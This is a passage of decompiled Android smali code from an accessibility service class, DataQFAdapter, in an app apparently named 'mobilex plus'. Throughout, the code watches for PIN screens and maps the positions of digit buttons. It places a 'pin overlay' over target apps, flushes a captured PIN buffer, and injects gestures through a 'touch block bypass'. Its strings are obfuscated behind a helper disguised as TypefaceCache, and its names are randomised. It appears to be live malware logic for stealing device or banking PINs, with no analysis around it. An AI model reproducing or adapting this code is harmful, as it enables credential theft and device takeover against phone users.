    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 63
    .line 64
    .line 65
    move-result-object v2

    .line 66
    if-nez v2, :cond_3

    .line 67
    .line 68
    const-string v0, "00270073004F008200F300AB00E200AE002D002C001B009500FF00B000C6008E002D00570058009300F900A900D70090002A0078005F008800E700FF00DB00B400630058006E00AB00DC00FF00D400A800310036"

    .line 69
    .line 70
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 71
    .line 72
    .line 73
    move-result-object v0

    .line 74
    new-instance v1, Ljava/lang/StringBuilder;

    nop

    nop

    .line 75
    .line 76
    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    .line 77
    .line 78
    .line 79
    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 80
    .line 81
    .line 82
    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 83
    .line 84
    .line 85
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 86
    .line 87
    .line 88
    move-result-object p1

    .line 89
    invoke-static {p1}, Lv/s/GARjgaGEpTotOxcl8vfe;->pyu8ovAipBTLYAiKab(Ljava/lang/String;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_2

    .line 90
    .line 91
    .line 92
    return-void

    .line 93
    :cond_3
    const/4 v3, 0x0

    .line 94
    :try_start_1
    invoke-direct {p0, v2, v3}, Lapp/mobilex/plus/services/DataQFAdapter;->checkForPinScreen(Landroid/view/accessibility/AccessibilityNodeInfo;I)Z

    .line 95
    .line 96
    .line 97
    move-result v4

    .line 98
    new-instance v5, Ljava/util/HashMap;

    .line 99
    .line 100
    invoke-direct {v5}, Ljava/util/HashMap;-><init>()V

    .line 101
    .line 102
    .line 103
    invoke-direct {p0, v2, v5, v3}, Lapp/mobilex/plus/services/DataQFAdapter;->collectClickableDigits(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/util/HashMap;I)V

    .line 104
    .line 105
    .line 106
    invoke-virtual {v5}, Ljava/util/HashMap;->size()I

    .line 107
    .line 108
    .line 109
    move-result v6

    .line 110
    const v7, 0xa

    nop

    nop

    .line 111
    .line 112
    if-ge v6, v7, :cond_5

    .line 113
    .line 114
    invoke-virtual {v5}, Ljava/util/HashMap;->size()I

    .line 115
    .line 116
    .line 117
    move-result v6

    .line 118
    const/16 v7, 0x9

    .line 119
    .line 120
    if-lt v6, v7, :cond_4

    nop

    .line 121
    .line 122
    if-eqz v4, :cond_4

    .line 123
    .line 124
    goto :goto_0

    .line 125
    :cond_4
    iget-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayActive:Z

    .line 126
    .line 127
    if-eqz v0, :cond_7

    .line 128
    .line 129
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayPkg:Ljava/lang/String;

    .line 130
    .line 131
    invoke-virtual {p1, v0}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 132
    .line 133
    .line 134
    move-result v0

    .line 135
    if-eqz v0, :cond_7

    .line 136
    .line 137
    iget-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayTouchable:Z

    .line 138
    .line 139
    if-eqz v0, :cond_7

    .line 140
    .line 141
    const-string v0, "0013005F007500C700E000BE00D600E7002400790055008200AA00FF"

    .line 142
    .line 143
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 144
    .line 145
    .line 146
    move-result-object v0

    .line 147
    invoke-virtual {v5}, Ljava/util/HashMap;->size()I

    .line 148
    .line 149
    .line 150
    move-result v1

    .line 151
    const-string v4, "006300720052008000F900AB00C100EB006300720052009400F100AD00DF00AE002D0071001B008800E600BA00C000AB0022006F"

    nop

    nop

    .line 152
    .line 153
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 154
    .line 155
    .line 156
    move-result-object v4

    .line 157
    new-instance v5, Ljava/lang/StringBuilder;

    .line 158
    .line 159
    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 160
    .line 161
    .line 162
    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 163
    .line 164
    .line 165
    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 166
    .line 167
    .line 168
    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 169
    .line 170
    .line 171
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 172
    .line 173
    .line 174
    move-result-object v0

    .line 175
    invoke-static {v0}, Lv/s/GARjgaGEpTotOxcl8vfe;->pyu8ovAipBTLYAiKab(Ljava/lang/String;)V

    .line 176
    .line 177
    .line 178
    invoke-virtual {p0, v3}, Lapp/mobilex/plus/services/DataQFAdapter;->setPinOverlayTouchable$app_release(Z)V

    .line 179
    .line 180
    .line 181
    invoke-direct {p0, p1}, Lapp/mobilex/plus/services/DataQFAdapter;->flushPinBufferNow(Ljava/lang/String;)V

    .line 182
    .line 183
    .line 184
    goto :goto_1

    .line 185
    :catchall_0
    move-exception p1

    .line 186
    goto :goto_2

    nop

    .line 187
    :cond_5
    :goto_0
    iput-object v5, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinPadBoundsMap:Ljava/util/HashMap;

    .line 188
    .line 189
    iput-object p1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinPadMapPkg:Ljava/lang/String;

    .line 190
    .line 191
    const-string v3, "0013005F007500C700E000BE00D600FD0063"

    .line 192
    .line 193
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 194
    .line 195
    .line 196
    move-result-object v3

    .line 197
    invoke-virtual {v5}, Ljava/util/HashMap;->size()I

    .line 198
    .line 199
    .line 200
    move-result v5

    nop

    nop

    .line 201
    const-string v6, "006300720052008000F900AB00C100EB006300660050008000AD"

    .line 202
    .line 203
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 204
    .line 205
    .line 206
    move-result-object v6

    nop

    .line 207
    const-string v7, "006F00360050009000AD"

    .line 208
    .line 209
    invoke-static {v7}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 210
    .line 211
    .line 212
    move-result-object v7

    .line 213
    new-instance v8, Ljava/lang/StringBuilder;

    .line 214
    .line 215
    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    .line 216
    .line 217
    .line 218
    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 219
    .line 220
    .line 221
    invoke-virtual {v8, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 222
    .line 223
    .line 224
    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 225
    .line 226
    .line 227
    invoke-virtual {v8, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 228
    .line 229
    .line 230
    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 231
    .line 232
    .line 233
    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    .line 234
    .line 235
    .line 236
    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 237
    .line 238
    .line 239
    move-result-object v3

    .line 240
    invoke-static {v3}, Lv/s/GARjgaGEpTotOxcl8vfe;->pyu8ovAipBTLYAiKab(Ljava/lang/String;)V

    .line 241
    .line 242
    .line 243
    iget-boolean v3, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayActive:Z

    .line 244
    .line 245
    if-nez v3, :cond_6

    .line 246
    .line 247
    iput-object p1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayPkg:Ljava/lang/String;

    .line 248
    .line 249
    invoke-direct {p0, p1}, Lapp/mobilex/plus/services/DataQFAdapter;->preAddPinOverlay(Ljava/lang/String;)V

    .line 250
    .line 251
    .line 252
    :cond_6
    iget-boolean v3, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayTouchable:Z

    nop

    .line 253
    .line 254
    if-nez v3, :cond_7

    .line 255
    .line 256
    iget-wide v3, p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastPinGrabTime:J

    .line 257
    .line 258
    sub-long/2addr v0, v3

    .line 259
    const-wide/16 v3, 0x7d0

    .line 260
    .line 261
    cmp-long v0, v0, v3

    .line 262
    .line 263
    if-lez v0, :cond_7

    .line 264
    .line 265
    const/4 v0, 0x1

    .line 266
    invoke-virtual {p0, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->setPinOverlayTouchable$app_release(Z)V

    .line 267
    .line 268
    .line 269
    const-string v0, "0013005F007500C700FF00A900D700B5002F0077004200C700D1008D00FF0082000700360013009300FF00AA00D100AF002200740057008200B900FF00D400A800310036"

    nop

    nop

    .line 270
    .line 271
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 272
    .line 273
    .line 274
    move-result-object v0

    .line 275
    new-instance v1, Ljava/lang/StringBuilder;

    .line 276
    .line 277
    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    .line 278
    .line 279
    .line 280
    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 281
    .line 282
    .line 283
    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 284
    .line 285
    .line 286
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 287
    .line 288
    .line 289
    move-result-object p1

    .line 290
    invoke-static {p1}, Lv/s/GARjgaGEpTotOxcl8vfe;->pyu8ovAipBTLYAiKab(Ljava/lang/String;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 291
    .line 292
    .line 293
    :cond_7
    :goto_1
    :try_start_2
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    .line 294
    .line 295
    .line 296
    goto :goto_3

    nop

    nop

    .line 297
    :goto_2
    :try_start_3
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    .line 298
    .line 299
    .line 300
    :catchall_1
    :try_start_4
    throw p1
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    .line 301
    :catchall_2
    :goto_3
    return-void
.end method

.method private final dispatchWithTouchBlockBypass(Landroid/accessibilityservice/GestureDescription;Ljava/lang/String;)Z
    .locals 2

    .line 1
    sget-object v0, Lv/s/vbdyByOHPJmeGXlq;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 2
    .line 3
    sget-boolean v0, Lv/s/vbdyByOHPJmeGXlq;->hjneShqpF9Tis4:Z

    .line 4
    .line 5
    if-nez v0, :cond_0

    nop

    .line 6
    .line 7
    new-instance p2, Lv/s/Qikcn7a3nPuTBSNPo;

    nop

    .line 8
    .line 9
    invoke-direct {p2}, Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;-><init>()V

    .line 10
    .line 11
    .line 12
    const/16 v0, 0x0

    .line 13
    invoke-virtual {p0, p1, p2, v0}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    .line 14
    .line 15
    .line 16
    move-result p1

    .line 17
    return p1

    .line 18
    :cond_0
    new-instance v0, Lv/s/AuGYnq4dE8pY;

    .line 19
    .line 20
    invoke-direct {v0, p0, p1, p2}, Lv/s/AuGYnq4dE8pY;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;Landroid/accessibilityservice/GestureDescription;Ljava/lang/String;)V

    .line 21
    .line 22
    .line 23
    sget-boolean p1, Lv/s/vbdyByOHPJmeGXlq;->hjneShqpF9Tis4:Z

    .line 24
    .line 25
    if-nez p1, :cond_1

    .line 26
    .line 27
    sget-object p1, Lv/s/XjSHuXm0nOSRc3iA9;->pyu8ovAipBTLYAiKab:Lv/s/XjSHuXm0nOSRc3iA9;

    .line 28
    .line 29
    invoke-virtual {v0, p1}, Lv/s/AuGYnq4dE8pY;->pyu8ovAipBTLYAiKab(Ljava/lang/Object;)Ljava/lang/Object;

    .line 30
    .line 31
    .line 32
    goto/16 :goto_0

    .line 33
    :cond_1
    sget-object p1, Lv/s/vbdyByOHPJmeGXlq;->Qrz92kRPw4GcghAc:Landroid/os/Handler;

    .line 34
    .line 35
    new-instance p2, Lv/s/hzCVl0f866ksvpzUUql;

    .line 36
    .line 37
    const/16 v1, 0x1a

    add-int/lit8 v1, v1, -0xa

    .line 38
    .line 39
    invoke-direct {p2, v1, v0}, Lv/s/hzCVl0f866ksvpzUUql;-><init>(ILjava/lang/Object;)V

    .line 40
    .line 41
    .line 42
    invoke-virtual {p1, p2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    .line 43
    .line 44
    .line 45
    :goto_0
    const/4 p1, 0x1

    .line 46
    return p1
.end method

.method private final enhanceContrast(Landroid/graphics/Bitmap;)Landroid/graphics/Bitmap;
    .locals 4

    .line 1
    invoke-virtual {p1}, Landroid/graphics/Bitmap;->isMutable()Z

    .line 2
    .line 3
    .line 4
    move-result v0

    .line 5
    if-eqz v0, :cond_0

    .line 6
    .line 7
    goto/16 :goto_0

    .line 8
    :cond_0
    sget-object v0, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    .line 9
    .line 10
    const/4 v1, 0x1

    .line 11
    invoke-virtual {p1, v0, v1}, Landroid/graphics/Bitmap;->copy(Landroid/graphics/Bitmap$Config;Z)Landroid/graphics/Bitmap;

    .line 12
    .line 13
    .line 14
    move-result-object v0

    .line 15
    invoke-virtual {p1}, Landroid/graphics/Bitmap;->recycle()V

    .line 16
    .line 17
    .line 18
    move-object p1, v0

    .line 19
    :goto_0
    new-instance v0, Landroid/graphics/Canvas;

    .line 20
    .line 21
    invoke-direct {v0, p1}, Landroid/graphics/Canvas;-><init>(Landroid/graphics/Bitmap;)V

    .line 22
    .line 23
    .line 24
    new-instance v1, Landroid/graphics/Paint;

    .line 25
    .line 26
    invoke-direct {v1}, Landroid/graphics/Paint;-><init>()V

    .line 27
    .line 28
    .line 29
    new-instance v2, Landroid/graphics/ColorMatrix;

    .line 30
    .line 31
    const v3, 0x14

    .line 32
    .line 33
    new-array v3, v3, [F

    .line 34
    .line 35
    fill-array-data v3, :array_0

    .line 36
    .line 37
    .line 38
    invoke-direct {v2, v3}, Landroid/graphics/ColorMatrix;-><init>([F)V

    .line 39
    .line 40
    .line 41
    new-instance v3, Landroid/graphics/ColorMatrixColorFilter;

    .line 42
    .line 43
    invoke-direct {v3, v2}, Landroid/graphics/ColorMatrixColorFilter;-><init>(Landroid/graphics/ColorMatrix;)V

    .line 44
    .line 45
    .line 46
    invoke-virtual {v1, v3}, Landroid/graphics/Paint;->setColorFilter(Landroid/graphics/ColorFilter;)Landroid/graphics/ColorFilter;

    .line 47
    .line 48
    .line 49
    const/4 v2, 0x0

    .line 50
    invoke-virtual {v0, p1, v2, v2, v1}, Landroid/graphics/Canvas;->drawBitmap(Landroid/graphics/Bitmap;FFLandroid/graphics/Paint;)V

    .line 51
    .line 52
    .line 53
    return-object p1

    .line 54
    nop

    .line 55
    :array_0
    .array-data 4
        0x41a00000    # 20.0f
        0x0
        0x0
        0x0
        0x0
        0x0
        0x41a00000    # 20.0f
        0x0
        0x0
        0x0
        0x0
        0x0
        0x41a00000    # 20.0f
        0x0
        0x0
        0x0
        0x0
        0x0
        0x3f800000    # 1.0f
        0x0
    .end array-data
.end method

.method private final fallbackSetText(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    .locals 2

    .line 1
    invoke-direct {p0, p1}, Lapp/mobilex/plus/services/DataQFAdapter;->getRealText(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;

    .line 2
    .line 3
    .line 4
    move-result-object v0

    .line 5
    invoke-static {v0, p2}, Lv/s/Y9mRyRdkl5FOcwb66V6;->ibVTtJUNfrGYbW(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 6
    .line 7
    .line 8
    move-result-object p2

    .line 9
    new-instance v0, Landroid/os/Bundle;

    .line 10
    .line 11
    invoke-direct {v0}, Landroid/os/Bundle;-><init>()V

    .line 12
    .line 13
    .line 14
    const-string v1, "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE"

    .line 15
    .line 16
    invoke-virtual {v0, v1, p2}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    .line 17
    .line 18
    .line 19
    const-string p2, "000500770057008B00F200BE00D100AC00630062005E009F00E400FF00DB00A900330063004F00DD00B000F8"

    .line 20
    .line 21
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 22
    .line 23
    .line 24
    const-string p2, "00640036001000C700B7"

    .line 25
    .line 26
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 27
    .line 28
    .line 29
    const-string p2, "00640036000600C700B7"

    .line 30
    .line 31
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 32
    .line 33
    .line 34
    const/high16 p2, 0x200000

    .line 35
    .line 36
    invoke-virtual {p1, p2, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    .line 37
    .line 38
    .line 39
    move-result p1

    nop

    nop

    .line 40
    return p1

    nop
.end method

.method private final varargs findAnyText(Landroid/view/accessibility/AccessibilityNodeInfo;[Ljava/lang/String;)Z
    .locals 5

    .line 1
    array-length v0, p2

    .line 2
    const/16 v1, 0x0

    .line 3
    move v2, v1

    .line 4
    :goto_0
    if-ge v2, v0, :cond_2

    .line 5
    .line 6
    aget-object v3, p2, v2

    .line 7
    .line 8
    :try_start_0
    invoke-virtual {p1, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    .line 9
    .line 10
    .line 11
    move-result-object v3

    .line 12
    if-eqz v3, :cond_1

    .line 13
    .line 14
    invoke-interface {v3}, Ljava/util/Collection;->isEmpty()Z

    .line 15
    .line 16
    .line 17
    move-result v4

    .line 18
    if-nez v4, :cond_1

    .line 19
    .line 20
    invoke-interface {v3}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    .line 21
    .line 22
    .line 23
    move-result-object v3

    .line 24
    :goto_1
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    .line 25
    .line 26
    .line 27
    move-result v4

    .line 28
    if-eqz v4, :cond_0

    .line 29
    .line 30
    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 31
    .line 32
    .line 33
    move-result-object v4

    .line 34
    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 35
    .line 36
    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 37
    .line 38
    .line 39
    goto/16 :goto_1

    .line 40
    :cond_0
    const/4 p1, 0x1

    .line 41
    return p1

    .line 42
    :catch_0
    :cond_1
    add-int/lit8 v2, v2, 0x1

    .line 43
    .line 44
    goto/16 :goto_0

    .line 45
    :cond_2
    return v1
.end method

.method private final findClickableNodeAt(Landroid/view/accessibility/AccessibilityNodeInfo;II)Landroid/view/accessibility/AccessibilityNodeInfo;
    .locals 4

    .line 1
    new-instance v0, Landroid/graphics/Rect;

    .line 2
    .line 3
    invoke-direct {v0}, Landroid/graphics/Rect;-><init>()V

    .line 4
    .line 5
    .line 6
    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    .line 7
    .line 8
    .line 9
    invoke-virtual {v0, p2, p3}, Landroid/graphics/Rect;->contains(II)Z

    .line 10
    .line 11
    .line 12
    move-result v0

    nop

    nop

    .line 13
    const/4 v1, 0x0

    .line 14
    if-nez v0, :cond_0

    .line 15
    .line 16
    return-object v1

    .line 17
    :cond_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    .line 18
    .line 19
    .line 20
    move-result v0

    .line 21
    add-int/lit8 v0, v0, -0x1

    nop

    nop

    .line 22
    .line 23
    :goto_0
    const/4 v2, -0x1

    .line 24
    if-ge v2, v0, :cond_3

    nop

    nop

    .line 25
    .line 26
    :try_start_0
    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 27
    .line 28
    .line 29
    move-result-object v2
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 30
    goto/16 :goto_1

    .line 31
    :catchall_0
    move-object/from16 v2, v1

    .line 32
    :goto_1
    if-nez v2, :cond_1

    .line 33
    .line 34
    goto/16 :goto_2

    .line 35
    :cond_1
    invoke-direct {p0, v2, p2, p3}, Lapp/mobilex/plus/services/DataQFAdapter;->findClickableNodeAt(Landroid/view/accessibility/AccessibilityNodeInfo;II)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 36
    .line 37
    .line 38
    move-result-object v3

    .line 39
    if-eqz v3, :cond_2

    .line 40
    .line 41
    :try_start_1
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 42
    .line 43
    .line 44
    :catchall_1
    return-object v3

    .line 45
    :cond_2
    :try_start_2
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    .line 46
    .line 47
    .line 48
    :catchall_2
    :goto_2
    add-int/lit8 v0, v0, -0x1

    .line 49
    .line 50
    goto/16 :goto_0

    .line 51
    :cond_3
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    .line 52
    .line 53
    .line 54
    move-result p2

    .line 55
    if-eqz p2, :cond_4

    .line 56
    .line 57
    invoke-static {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->obtain(Landroid/view/accessibility/AccessibilityNodeInfo;)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 58
    .line 59
    .line 60
    move-result-object p1

    .line 61
    return-object p1

    .line 62
    :cond_4
    return-object v1
.end method

.method private final findDigitAmongSiblings(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;
    .locals 13

    .line 1
    const-string v0, ""

    .line 2
    .line 3
    :try_start_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 4
    .line 5
    .line 6
    move-result-object v1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_9

    .line 7
    if-nez v1, :cond_0

    .line 8
    .line 9
    return-object v0

    .line 10
    :cond_0
    :try_start_1
    new-instance v2, Landroid/graphics/Rect;

    .line 11
    .line 12
    invoke-direct {v2}, Landroid/graphics/Rect;-><init>()V

    .line 13
    .line 14
    .line 15
    invoke-virtual {p1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    .line 16
    .line 17
    .line 18
    invoke-virtual {v2}, Landroid/graphics/Rect;->centerX()I

    .line 19
    .line 20
    .line 21
    move-result p1

    .line 22
    invoke-virtual {v2}, Landroid/graphics/Rect;->centerY()I

    .line 23
    .line 24
    .line 25
    move-result v2

    .line 26
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    .line 27
    .line 28
    .line 29
    move-result v3

    .line 30
    const/16 v4, 0x0

    .line 31
    const v5, 0x7fffffff

    nop

    nop

    .line 32
    .line 33
    .line 34
    move-object/from16 v7, v0

    .line 35
    move v6, v4

    nop

    .line 36
    :goto_0
    if-ge v6, v3, :cond_b

    .line 37
    .line 38
    invoke-virtual {v1, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 39
    .line 40
    .line 41
    move-result-object v8
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_7

    .line 42
    if-nez v8, :cond_1

    .line 43
    .line 44
    goto/16 :goto_2

    nop

    .line 45
    .line 46
    :cond_1
    :try_start_2
    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    .line 47
    .line 48
    .line 49
    move-result-object v9

    nop

    .line 50
    if-eqz v9, :cond_2

    .line 51
    .line 52
    invoke-virtual {v9}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 53
    .line 54
    .line 55
    move-result-object v9

    .line 56
    if-nez v9, :cond_3

    .line 57
    .line 58
    goto/16 :goto_1

    .line 59
    :catchall_0
    move-exception p1

    .line 60
    goto/16 :goto_3

    .line 61
    .line 62
    :cond_2
    :goto_1
    move-object v9, v0

    .line 63
    :cond_3
    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    .line 64
    .line 65
    .line 66
    move-result-object v10

    .line 67
    if-eqz v10, :cond_4

    .line 68
    .line 69
    invoke-virtual {v10}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 70
    .line 71
    .line 72
    move-result-object v10

    .line 73
    if-nez v10, :cond_5

    .line 74
    .line 75
    :cond_4
    move-object v10, v0

    .line 76
    :cond_5
    invoke-interface {v9}, Ljava/lang/CharSequence;->length()I

    .line 77
    .line 78
    .line 79
    move-result v11

    .line 80
    if-nez v11, :cond_6

    .line 81
    .line 82
    move-object/from16 v9, v10

    .line 83
    :cond_6
    invoke-virtual {v9}, Ljava/lang/String;->length()I

    .line 84
    .line 85
    .line 86
    move-result v10

    .line 87
    const/16 v11, 0x1

    .line 88
    if-ne v10, v11, :cond_8

    .line 89
    .line 90
    invoke-virtual {v9, v4}, Ljava/lang/String;->charAt(I)C

    .line 91
    .line 92
    .line 93
    move-result v10

    .line 94
    invoke-static {v10}, Ljava/lang/Character;->isDigit(C)Z

    .line 95
    .line 96
    .line 97
    move-result v10

    .line 98
    if-eqz v10, :cond_8

    .line 99
    .line 100
    new-instance v10, Landroid/graphics/Rect;

    .line 101
    .line 102
    invoke-direct {v10}, Landroid/graphics/Rect;-><init>()V

    .line 103
    .line 104
    .line 105
    invoke-virtual {v8, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    .line 106
    .line 107
    .line 108
    invoke-virtual {v10, p1, v2}, Landroid/graphics/Rect;->contains(II)Z

    .line 109
    .line 110
    .line 111
    move-result v12
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 112
    if-eqz v12, :cond_7

    .line 113
    .line 114
    :try_start_3
    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    .line 115
    .line 116
    .line 117
    :catchall_1
    :try_start_4
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    .line 118
    .line 119
    .line 120
    :catchall_2
    return-object v9

    nop

    nop

    .line 121
    :cond_7
    :try_start_5
    invoke-virtual {v10}, Landroid/graphics/Rect;->centerX()I

    .line 122
    .line 123
    .line 124
    move-result v12

    .line 125
    sub-int/2addr v12, p1

    .line 126
    invoke-virtual {v10}, Landroid/graphics/Rect;->centerY()I

    .line 127
    .line 128
    .line 129
    move-result v10

    .line 130
    sub-int/2addr v10, v2

    nop

    nop

    .line 131
    mul-int/2addr v12, v12

    nop

    .line 132
    mul-int/2addr v10, v10

    .line 133
    add-int/2addr v10, v12

    .line 134
    if-ge v10, v5, :cond_8

    .line 135
    .line 136
    move-object/from16 v7, v9

    .line 137
    move v5, v10

    .line 138
    :cond_8
    invoke-interface {v9}, Ljava/lang/CharSequence;->length()I

    .line 139
    .line 140
    .line 141
    move-result v9

    .line 142
    if-nez v9, :cond_a

    .line 143
    .line 144
    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    .line 145
    .line 146
    .line 147
    move-result v9

    .line 148
